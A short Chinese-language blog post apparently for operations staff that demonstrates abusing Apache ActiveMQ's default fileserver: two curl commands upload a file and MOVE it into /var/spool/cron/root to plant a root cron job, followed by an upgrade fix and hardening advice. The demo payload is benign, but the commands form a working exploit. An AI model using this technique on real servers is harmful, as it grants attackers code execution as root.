---
layout: post
title: "利用activemq的fileserver漏洞修改系统cron"
date: 2018-03-06
comments: false
categories: 运维
---

当服务器安装activemq后，默认开启fileserver用于文件上传，我们可以通过下面指令达到修改系统cron的目的

```bash
# 本地1.txt内容
* * * * * date >> /tmp/1.out

# 将本地1.txt上传至服务器
curl -X put http://server-ip:8161/fileserver/1.txt --upload-file 1.txt

# 将上传后的1.txt移动到/var/spool/cron/root
curl -X MOVE http://server-ip:8161/fileserver/1.txt -H 'Destination: file:///var/spool/cron/root'

# 检查cron服务
crontab -l
```
会发现`* * * * * date >> /tmp/1.out`，即每分钟执行date并输出到/tmp/1.out下

### 漏洞关闭方法

* 升级至5.14.x

### 思索

* 软件尽量不要直接用root运行
* 服务端口能不公开尽量不要公开
* 注意关于一些软件的漏洞报告，如redis、activemq
